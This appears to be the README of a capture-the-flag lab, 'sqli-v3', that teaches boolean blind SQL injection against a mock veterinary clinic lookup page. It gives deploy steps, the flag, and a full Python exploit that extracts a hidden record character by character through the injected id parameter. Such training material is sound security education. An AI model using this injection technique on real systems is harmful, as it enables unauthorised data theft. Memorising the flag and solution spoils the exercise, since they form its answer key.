# sqli-v3 — Boolean Blind SQL Injection

**Vulnerability:** Patient lookup endpoint returns only true/false responses; flag extractable via binary search  
**Tools:** `python3`, `sqlmap --technique=B`  
**Flag:** `WMG{bl1nd_sql1_tr00th_0r_n0_tr00th}`

## Scenario

Northgate Veterinary Clinic runs a patient lookup at `/lookup.php?id=N`. The
PHP backend queries a SQLite database but returns only `"Patient found: <name>"`
or `"No record found."` — no data is echoed back. A hidden `clinic_secrets`
table holds the flag.

Students must identify the boolean blind injection point (the `id` parameter),
then extract the hidden record character by character using
`UNICODE(SUBSTR(record,N,1))>=MID` binary search — or automate it with
`sqlmap --technique=B`. The exploit script makes ~245 requests and completes in
~15 seconds.

This game is distinct from `sqli-login` (boolean bypass) and `sqli-v2` (UNION
extraction). It teaches the blind injection class.

## Deploy

```bash
ansible-playbook -i inventory/hosts.ini games/sqli-v3/setup.yml
```

First run: `ok=10 changed=6`  
Second run: `ok=10 changed=1` (Apache restart is intentional)

## Verify

```bash
./agent-harness/verify.sh sqli-v3
```

## Expected exploit (Python binary search)

```python
import urllib.request, urllib.parse

TARGET = "http://127.0.0.1/lookup.php"

def query(payload):
    url = TARGET + "?id=" + urllib.parse.quote(payload)
    resp = urllib.request.urlopen(url, timeout=5).read().decode()
    return "Patient found" in resp

# Get length of secret
length = 0
for i in range(1, 200):
    if not query(f"1 AND LENGTH((SELECT record FROM clinic_secrets LIMIT 1))>={i}"):
        length = i - 1
        break

# Extract each character via binary search
flag = ""
for pos in range(1, length + 1):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if query(f"1 AND UNICODE(SUBSTR((SELECT record FROM clinic_secrets LIMIT 1),{pos},1))>={mid}"):
            lo = mid + 1
        else:
            hi = mid
    flag += chr(lo - 1)

print(flag)  # → WMG{bl1nd_sql1_tr00th_0r_n0_tr00th}
```

## Training

`training.json` — 9 levels: web enumeration → endpoint discovery → boolean SQLi theory → true/false oracle → binary search → character extraction → sqlmap automation → flag → ASSESSMENT.  
MITRE ATT&CK: T1190 (Exploit Public-Facing Application), T1005 (Data from Local System).  
CyberRangeCZ subnet: 10.1.36.0/24
